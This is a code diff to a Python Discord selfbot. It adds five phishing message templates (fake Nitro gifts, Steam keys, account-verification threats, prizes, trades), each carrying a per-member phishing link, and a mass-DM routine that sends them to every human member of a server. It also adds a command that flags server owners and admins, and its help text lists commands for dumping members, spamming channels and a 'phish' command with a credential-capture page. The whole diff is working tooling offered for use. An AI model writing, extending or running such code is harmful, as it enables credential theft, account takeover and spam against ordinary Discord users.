@@ -71,6 +71,47 @@ DM_DELAY     = 1.2   # seconds between DMs — lower = faster but riskier
 SPAM_DELAY   = 0.8   # seconds between spam messages
 JOIN_DELAY   = 2.0   # seconds after joining before doing anything
 
+# ── mass DM templates ─────────────────────────────────────────
+# use >>massdm <id> template:<name> to send a template
+# or >>massdm <id> <custom message> for custom text
+DM_TEMPLATES = {
+    "nitro": (
+        "🎁 **You've been selected for a free Discord Nitro gift!**\n\n"
+        "Someone sent you **3 months of Discord Nitro** as a gift.\n"
+        "Claim it here before it expires (48 hours left):\n"
+        "{phish_link}\n\n"
+        "*This gift was sent anonymously through Discord's gifting system.*"
+    ),
+    "steam": (
+        "🎮 **Free Steam game offer — limited time!**\n\n"
+        "Hey! I had an extra key for a game and thought you might want it.\n"
+        "Grab it here before someone else does:\n"
+        "{phish_link}\n\n"
+        "*Keys are first-come, first-served — act fast.*"
+    ),
+    "verify": (
+        "✅ **Action required — verify your Discord account**\n\n"
+        "Discord has flagged your account for routine verification.\n"
+        "Complete verification to avoid suspension:\n"
+        "{phish_link}\n\n"
+        "*Failure to verify within 24 hours may result in account restriction.*"
+    ),
+    "win": (
+        "🏆 **Congratulations! You've been selected as a winner!**\n\n"
+        "You've been chosen from {server} members to receive a special reward.\n"
+        "Claim your prize here:\n"
+        "{phish_link}\n\n"
+        "*This offer expires in 24 hours.*"
+    ),
+    "trade": (
+        "💰 **Quick trade offer — interested?**\n\n"
+        "Hey, saw you in {server} and wanted to offer you a deal on some rare items.\n"
+        "Check out what I have here:\n"
+        "{phish_link}\n\n"
+        "*Limited stock — just letting a few people know first.*"
+    ),
+}
+
 # ── client ────────────────────────────────────────────────────
 client = discord.Client()
 
@@ -157,18 +198,21 @@ async def on_message(message: discord.Message):
 
     # ── >>help ────────────────────────────────────────────────
     elif cmd == "help":
+        tpl_names = ", ".join(f"`{k}`" for k in DM_TEMPLATES)
         lines = [
             "**LH Selfbot Commands** (prefix: `>>`)",
             "",
             "`>>spy` — list all servers",
             "`>>members <serverID>` — dump members",
             "`>>massdm <serverID> <message>` — DM all humans",
-            "`>>phish <serverID>` — phish DM all humans",
+            f"`>>massdm <serverID> template:<name>` — template DM | templates: {tpl_names}",
+            "`>>phish <serverID>` — phish DM all humans (Nitro bait + cred capture page)",
             "`>>spam <serverID> <channelID> <count> <message>` — spam a channel",
             "`>>join <invite_code>` — join a server",
             "`>>leave <serverID>` — leave a server",
             "`>>scrape <serverID>` — server info dump",
             "`>>status <text>` — set custom status",
+            "`>>admin <serverID> <@mention|userID>` — check if user has admin/dangerous perms",
             "`>>purge <count>` — delete your last N messages here",
             "`>>ping` — latency",
         ]
@@ -208,32 +252,56 @@ async def on_message(message: discord.Message):
             await report_to_self(f"```\n{chunk}\n```")
         await reply(message, f"📋 Members sent to your DMs. ({len(guild.members)} members)")
 
-    # ── >>massdm <id> <msg> ───────────────────────────────────
+    # ── >>massdm <id> <msg|template:name> ────────────────────────
     elif cmd == "massdm":
         sub = args.split(" ", 1)
         if len(sub) < 2:
-            await reply(message, "Usage: `>>massdm <serverID> <message>`"); return
-        server_id_str, dm_message = sub[0], sub[1]
+            tpl_list = ", ".join(f"`{k}`" for k in DM_TEMPLATES)
+            await reply(message, f"Usage: `>>massdm <serverID> <message>`\nTemplates: {tpl_list}\nExample: `>>massdm 123 template:nitro`"); return
+        server_id_str, dm_message = sub[0], sub[1].strip()
         try:
             guild = client.get_guild(int(server_id_str))
         except ValueError:
             await reply(message, "Invalid server ID."); return
         if not guild:
             await reply(message, "Not in that server."); return
+
+        # resolve template if used
+        if dm_message.startswith("template:"):
+            tpl_name = dm_message[9:].strip().lower()
+            if tpl_name not in DM_TEMPLATES:
+                await reply(message, f"❌ Unknown template `{tpl_name}`. Available: {', '.join(DM_TEMPLATES)}"); return
+            raw = DM_TEMPLATES[tpl_name]
+            dm_message = raw.format(
+                phish_link=f"{PHISH_URL}/claim/{{member_id}}" if PHISH_URL else "[no phish url set]",
+                server=guild.name
+            )
+            use_template = tpl_name
+        else:
+            use_template = None
+
         success = 0; failed = 0
-        await reply(message, f"📨 Starting mass DM to {guild.member_count} members in **{guild.name}**...")
+        await reply(message, f"📨 Mass DM starting — **{guild.name}** | {'template: ' + use_template if use_template else 'custom message'}")
         for member in guild.members:
             if member.bot or member.id == client.user.id:
                 continue
             try:
-                await member.send(dm_message)
+                # inject per-member phish link if template
+                if use_template and PHISH_URL:
+                    msg_out = DM_TEMPLATES[use_template].format(
+                        phish_link=f"{PHISH_URL}/claim/{member.id}",
+                        server=guild.name
+                    )
+                else:
+                    msg_out = dm_message
+                await member.send(msg_out)
                 success += 1
                 await asyncio.sleep(DM_DELAY)
             except Exception:
                 failed += 1
         await report_to_self(
             f"✅ Mass DM complete — **{guild.name}**\n"
-            f"Sent: {success} | Failed: {failed}"
+            f"Template: `{use_template or 'custom'}` | Sent: {success} | Failed: {failed}"
         )
 
     # ── >>phish <id> ──────────────────────────────────────────
@@ -394,6 +462,68 @@ async def on_message(message: discord.Message):
             if deleted >= count:
                 break
         await reply(message, f"🗑️ Deleted {deleted} of your messages.")
+
+    # ── >>admin <serverID> <@mention|userID> ─────────────────────
+    elif cmd == "admin":
+        sub = args.split(" ", 1)
+        if len(sub) < 2:
+            await reply(message, "Usage: `>>admin <serverID> <@mention or userID>`"); return
+        try:
+            guild = client.get_guild(int(sub[0].strip()))
+        except ValueError:
+            await reply(message, "Invalid server ID."); return
+        if not guild:
+            await reply(message, "Not in that server."); return
+
+        # resolve user — handle @mention or raw ID
+        target_str = sub[1].strip()
+        target_id  = None
+        if target_str.startswith("<@") and target_str.endswith(">"):
+            target_id = int(target_str.replace("<@", "").replace("!", "").replace(">", ""))
+        else:
+            try:
+                target_id = int(target_str)
+            except ValueError:
+                await reply(message, "❌ Provide a valid user ID or @mention."); return
+
+        member = guild.get_member(target_id)
+        if not member:
+            try:
+                member = await guild.fetch_member(target_id)
+            except Exception:
+                await reply(message, f"❌ User `{target_id}` not found in **{guild.name}**."); return
+
+        # check permissions
+        perms = member.guild_permissions
+        is_owner   = guild.owner_id == member.id
+        is_admin   = perms.administrator
+        dangerous  = []
+        if perms.manage_guild:      dangerous.append("Manage Server")
+        if perms.ban_members:       dangerous.append("Ban Members")
+        if perms.kick_members:      dangerous.append("Kick Members")
+        if perms.manage_roles:      dangerous.append("Manage Roles")
+        if perms.manage_channels:   dangerous.append("Manage Channels")
+        if perms.manage_webhooks:   dangerous.append("Manage Webhooks")
+        if perms.mention_everyone:  dangerous.append("Mention Everyone")
+
+        # build role list
+        roles = [r.name for r in member.roles if not r.is_default()]
+        roles_str = ", ".join(roles) if roles else "none"
+
+        status = []
+        if is_owner:  status.append("👑 **SERVER OWNER**")
+        if is_admin:  status.append("🔴 **ADMINISTRATOR**")
+        if dangerous: status.append("🟠 Dangerous perms: " + ", ".join(dangerous))
+        if not status: status.append("🟢 No elevated permissions")
+
+        lines = [
+            f"**Permission Check — {guild.name}**",
+            f"User: **{member}** (`{member.id}`)",
+            f"Roles: {roles_str}",
+            "",
+        ] + status
+
+        await reply(message, "\n".join(lines))
 
     else:
         await reply(message, f"Unknown command `{cmd}`. Type `>>help` for the list.")
